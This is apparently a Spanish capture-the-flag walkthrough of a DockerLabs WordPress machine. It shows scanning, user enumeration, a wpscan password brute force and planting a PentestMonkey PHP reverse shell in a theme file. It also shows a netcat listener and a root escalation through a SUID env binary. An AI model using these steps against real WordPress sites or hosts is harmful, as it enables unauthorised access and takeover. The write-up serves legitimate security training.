# MACHINE WALKINGCMS

## INFORMACIÓN GENERAL

- **Plataforma**: DockerLabs
- **Sistema Operativo**: Linux
- **Dificultad**: Fácil

![machine_dockerlabs](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/dockerlabs/images/WalkingCms/machine_dockerlabs.png)

## DESPLIEGUE

```python
bash autodeploy.sh walkingcms.tar
```
![despliegue](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/dockerlabs/images/WalkingCms/DESPLIEGUE.png)

## RECONOCIMIENTO

```python
nmap -p- -sS --min-rate 5000 -vvvv -n -Pn -sCV 172.17.0.2 -oN ports
```

```ruby
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000024s latency).
Scanned at 2025-03-03 21:58:18 -05 for 11s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Debian))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
```
Si nos vamos a la web que aloja el puerto 80, nos encontramos con la informacion del servidor de apache

![info_apache](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/dockerlabs/images/WalkingCms/info_apache.png)

en este caso vamos a enumerar un poco con *Gobuster* a ver que nos encontramos

## ENUMERACIÓN
```ruby
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,txt,php,xml,csv,txt,html -t 20 -b 500,502,404
```
```ruby
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404,500,502
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,php,xml,csv
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10701]
/wordpress            (Status: 301) [Size: 312] [--> http://172.17.0.2/wordpress/]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
```
Si nos fijamos tenemos un directorio muy interesnate que es `wordpress`, vamos a ver que contiene

![wordpress1](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/dockerlabs/images/WalkingCms/wordpress1.png)

No encontramos nada intersante, vamos a seguir enumerarando directorios por detras de `http://172.17.0.2/wordpress`

```ruby
gobuster dir -u http://172.17.0.2/wordpress/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,txt,php,xml,csv,txt,html -t 20 -b 500,502,404 
```
```ruby
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/wordpress/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   500,502,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              csv,html,txt,php,xml
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/index.php            (Status: 301) [Size: 0] [--> http://172.17.0.2/wordpress/]
/wp-content           (Status: 301) [Size: 323] [--> http://172.17.0.2/wordpress/wp-content/]
/license.txt          (Status: 200) [Size: 19915]
/wp-includes          (Status: 301) [Size: 324] [--> http://172.17.0.2/wordpress/wp-includes/]
/readme.html          (Status: 200) [Size: 7409]
/wp-login.php         (Status: 200) [Size: 7765]
/wp-trackback.php     (Status: 200) [Size: 136]
/wp-admin             (Status: 301) [Size: 321] [--> http://172.17.0.2/wordpress/wp-admin/]
/xmlrpc.php           (Status: 405) [Size: 42]
```
Si nos fijamos tenemos varios recuros de `wordpress`, hay un archivo que muchas veces suele ser una via potencial de ataque que es el 
`/xmlrpc.php (es un archivo en WordPress que habilita la comunicación remota con el sitio usando el protocolo XML-RPC)`, pero si lo examinos solo nos muestra un mensaje que dice `XML-RPC server accepts POST requests only.`

Como tenemos un `wordpress`, vamos a enumerarlo, para ver si encontramos algo intersante

```ruby
wpscan --url http://172.17.0.2/wordpress/ --enumerate u, vp
```

-**`--enumerate`**: Este parámetro es para indicar que tipo de informacion queremos enumerar

-**`u`**: parámetro para enumerar usuarios

-**`vp`**: parámetros para enumerar pluggins vulnerables

![wpscan](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/dockerlabs/images/WalkingCms/wpscan.png)

Vemos que nos encuentra un usuario de nombre `mario` y el tema que se esta actualizando `twentytwentytwo` y que esta desactualizaca, y la ruta donde la podemos 
encontrar


## EXPLOTACION
*COMO TENEMOS UN USUARIO Y UN `wp-login.php`, vamos a aplicar una fuerza bruta a ver si encontramos la password
```ruby
wpscan --url http://172.17.0.2/wordpress/ -U mario -P /usr/share/wordlists/rockyou.txt
```
```ruby
[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - mario / love                                                                                                                                                                                                              
Trying mario / dakota Time: 00:00:05 <                                                                                                                                                        > (390 / 14344782)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: mario, Password: love
```
Hemos encontrado las credenciales del `wordpress` que son `mario:love`, nos logeamos y una vez adentro podemos revisar `Apariencia/Theme Code Editor`, para ver si nos podemos aprovechar de algo como nos enumero `wpscan`

![twenty_twenty_to](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/dockerlabs/images/WalkingCms/twenty_twentyto.png)

Tenemos capacidad de escribir codigo, facilmente nos podemos montar un codigo de una `reverse shell`, vamos a usar el codigo php de nuestro amigo `Pentest Monkey`


Web: [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

Borramos el codigo original y copiamos el `php-reverse.shell.php` ajustando parametros necesarios y nos ponemos en escucha con netcat 
```ruby
nc -nlvp 1234
```

Usamos la ruta de los temas, nos lo enumeró `wpscan` si se acuerdan
```ruby
http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php
```
![reverse_shell_exitosa](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/dockerlabs/images/WalkingCms/reverse_shell_exitosa.png)

Hemos realizado la `reverse shell` con exito ahora el siguiente paso es poder escalar privilegios a `root`

### Tratamiento de la TTY
```ruby
script /dev/null -c bash
ctrl + z
stty raw -echo:fg
        reset xterm
export TERM=xterm
export SHELL=bash
```

# ESCALADA DE PRIVILEGIOS 

Si hacemos `sudo -l` no reconoce el comando entonces vamos a tratar de abusar de permisos SUID si encontramos
```ruby
find / -perm -4000 2>/dev/null 
```

![SUID_env](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/dockerlabs/images/WalkingCms/SUID_env.png)

Como tenemos `/usr/bin/env` con permisos SUID, visitamos [GFTObins](https://gtfobins.github.io/gtfobins/env/#sudo) una web famosa para la *Escalada de Privilegios y Bypasses de Restricciones*

![GTFObins](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/dockerlabs/images/WalkingCms/GTFObins.png)

```ruby
./env /bin/sh -p
```
![root](https://github.com/Jean25-sys/CTFs_Wintx/blob/main/Writeups/dockerlabs/images/WalkingCms/root.png)






